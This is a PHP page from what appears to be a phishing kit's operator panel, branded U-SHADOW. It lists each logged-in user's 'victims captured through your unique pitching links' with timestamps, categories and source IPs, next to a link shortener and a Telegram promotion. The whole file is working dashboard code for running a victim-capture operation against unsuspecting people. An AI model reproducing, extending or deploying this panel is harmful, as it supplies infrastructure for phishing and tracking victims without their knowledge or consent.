<?php
require_once __DIR__ . '/config.php';
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];

$analytics_data = json_decode(file_get_contents(ANALYTICS_FILE), true);
$user_analytics = array_filter($analytics_data, function($v) use ($user) {
    return ($v['user_id'] ?? '') === $user['username'];
});
krsort($user_analytics);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-SHADOW | My Victims</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="old-dashboard-body">

<div class="container-old">
    <header class="header-old">
        <div class="brand-top">U-SHADOW</div>
        <div class="telegram-banner">
             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
                <i class="fab fa-telegram"></i> Join Our Telegram
             </a>
        </div>
    </header>

    <nav class="navbar-old">
        <ul>
            <li><a href="dashboard.php"><i class="fas fa-home"></i> Home</a></li>
            <li><a href="victims.php"><i class="fas fa-skull"></i> My Victims</a></li>
            <li><a href="signup.php" style="display: none;"><i class="fas fa-user-plus"></i> Sign Up</a></li>
            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
            <li><a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
        </ul>
    </nav>

    <main class="main-old">
        <div class="breadcrumb-old">.: My Victims Log :.</div>
        <div class="welcome-msg">
            Below is a list of all victims captured through your unique pitching links.
        </div>

        <section class="panel-old">
            <div class="panel-header-old">Victims Tracking</div>
            <div class="panel-body-old" style="padding: 0;">
                <table class="custom-table" style="width: 100%; border-collapse: collapse;">
                    <thead>
                        <tr style="background: #f9f9f9; border-bottom: 1px solid #ddd;">
                            <th style="padding: 12px; text-align: left; font-size: 13px;">Date & Time</th>
                            <th style="padding: 12px; text-align: left; font-size: 13px;">Hub Category</th>
                            <th style="padding: 12px; text-align: left; font-size: 13px;">Source IP</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($user_analytics)): ?>
                            <tr><td colspan="3" style="padding: 30px; text-align: center; color: #999;">No victims captured yet. Start sharing your links!</td></tr>
                        <?php else: ?>
                            <?php foreach ($user_analytics as $v): ?>
                            <tr style="border-bottom: 1px solid #eee;">
                                <td style="padding: 12px; font-size: 13px;"><?php echo s($v['timestamp'] ?? 'N/A'); ?></td>
                                <td style="padding: 12px; font-size: 13px;"><span style="color: #c0392b; font-weight: 700;"><?php echo s(strtoupper($v['category'] ?? 'UNKNOWN')); ?></span></td>
                                <td style="padding: 12px; font-size: 13px; color: #666; font-family: monospace;"><?php echo s($v['source_ip'] ?? '0.0.0.0'); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>
    </main>

    <footer class="footer-old">
        Contact Admin: <a href="mailto:<?php echo s(ADMIN_EMAIL); ?>" style="color: #c0392b; font-weight: 700;"><?php echo s(ADMIN_EMAIL); ?></a><br>
        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
        <strong>U-SHADOW v3.5 &copy;</strong>
    </footer>
</div>

</body>
</html>
